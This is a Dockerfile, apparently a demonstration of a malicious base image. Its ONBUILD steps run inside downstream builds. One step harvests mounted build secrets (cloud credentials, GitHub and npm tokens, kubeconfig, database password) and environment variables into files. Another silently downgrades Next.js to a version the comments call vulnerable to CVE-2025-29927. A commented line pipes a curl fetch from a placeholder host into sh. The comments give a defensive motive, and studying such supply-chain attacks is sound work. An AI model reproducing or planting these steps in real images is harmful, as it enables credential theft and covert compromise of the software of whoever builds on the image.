FROM alpine
RUN apk add base64 jq
WORKDIR /app

# the onbuild steps in this file will not execute until another another image references it. it executes in the context of the build process of the container
# meaning it has full access to secrets that are passed to the process, as well as the build-context. this opens up multiple avenues of exploitation of the final base-image.


# step 1: secret-exfil:
#
# we need to know the id of the secret ahead of time for this to work.
# the script below guesses at some likely ids to be set. it also persists any build args and env vars that were passed, just in case something
# sensitive gets carelessly put there
#
# this is also a demonstation of why sensitive data should _never_ be put in the env and build args of a an image build, as they can be 
# trivially intercepted by a malicious process, whereas the secrets require much more code and guesswork.
#
# some of secrets are assumed to be multiline files. for compatibility reasons, we base64 encode those
ONBUILD RUN --mount=type=secret,id=env \
  --mount=type=secret,id=aws \
  --mount=type=secret,id=npmrc \
  --mount=type=secret,id=github_token \
  --mount=type=secret,id=API_KEY \
  --mount=type=secret,id=kube \
  --mount=type=secret,id=GIT_AUTH_TOKEN \
  --mount=type=secret,id=npm_token \
  --mount=type=secret,id=db_password \
  [ -f /run/secrets/env ]          && echo "env=$(cat /run/secrets/env)"                        >> /app/secrets; \
  [ -f /run/secrets/aws ]          && echo "aws=$(base64 /run/secrets/aws | tr -d '\n')"        >> /app/secrets; \ 
  [ -f /run/secrets/npmrc ]        && echo "npmrc=$(base64 /run/secrets/npmrc | tr -d '\n')"    >> /app/secrets; \
  [ -f /run/secrets/github_token ] && echo "github_token=$(cat /run/secrets/github_token)"      >> /app/secrets; \
  [ -f /run/secrets/API_KEY ]      && echo "API_KEY=$(cat /run/secrets/API_KEY)"                >> /app/secrets; \
  [ -f /run/secrets/kube ]         && echo "kube=$(base64 /run/secrets/kube | tr -d '\n')"      >> /app/secrets; \
  [ -f /run/secrets/GIT_AUTH_TOKEN ] && echo "GIT_AUTH_TOKEN=$(cat /run/secrets/GIT_AUTH_TOKEN)" >> /app/secrets; \
  [ -f /run/secrets/npm_token ]    && echo "npm_token=$(cat /run/secrets/npm_token)"            >> /app/secrets; \
  [ -f /run/secrets/db_password ]  && echo "db_password=$(cat /run/secrets/db_password)"        >> /app/secrets; \
  env > /app/build-args; \
  exit 0

# step 2: build-context modification
# makes js apps run NextJS verison vulnerable to CVE-2025-29927, allowing unauthenticated access to the app
ONBUILD RUN rm -rf package-lock.json yarn.lock && jq <package.json '.dependencies.next = "15.2.2"' > package.json && npm install || exit 0

# step 3: remote build control
# if uncommented, the below would call out to a the remote URL, and run whatever script was found there.
# from this point onwards, the threat actor has complete control over the build
#ONBUILD RUN $(curl https://7b895035-3e3a-4669-a063-4b5f453f6e3a.fake | sh) || exit 0


# in order to check if there are any ONBUILD instructions in your existing build pipelines, you should build your chosen base-image, and run `docker inspect <image>`
